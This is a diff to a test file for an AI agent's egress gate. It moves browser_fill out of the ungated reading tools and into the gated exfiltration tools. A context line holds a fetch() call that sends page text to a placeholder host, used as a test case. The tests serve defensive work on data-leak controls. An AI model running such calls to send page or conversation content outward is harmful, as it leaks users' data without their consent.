@@ -56,6 +56,8 @@ EGRESS = [
      lambda: browsing.browser_eval("fetch('https://x/'+document.body.innerText)")),
     ("browser_upload", browsing, "live_browser_available",
      lambda: browsing.browser_upload("file", "notes.txt")),
+    ("browser_fill", browsing, "live_browser_available",
+     lambda: browsing.browser_fill("q", "the whole conversation", enter=True)),
 ]
 
 PERSISTENCE = [
@@ -115,9 +117,10 @@ def test_reading_tools_are_not_gated():
     """fetch_url / web_search / rss / browser_open|click|fill must not consult the egress gate —
     they are the read path, and they are what SETS the taint."""
     import inspect
+    # browser_fill is NOT in this list: it takes arbitrary model-controlled text and enter=True
+    # submits, which is outbound transfer, not reading. It is gated with the other egress tools.
     for mod, name in [(web, "fetch_url"), (web, "web_search"), (web, "rss"),
-                      (browsing, "browser_open"), (browsing, "browser_click"),
-                      (browsing, "browser_fill")]:
+                      (browsing, "browser_open"), (browsing, "browser_click")]:
         fn = getattr(mod, name, None)
         if fn is None:
             continue
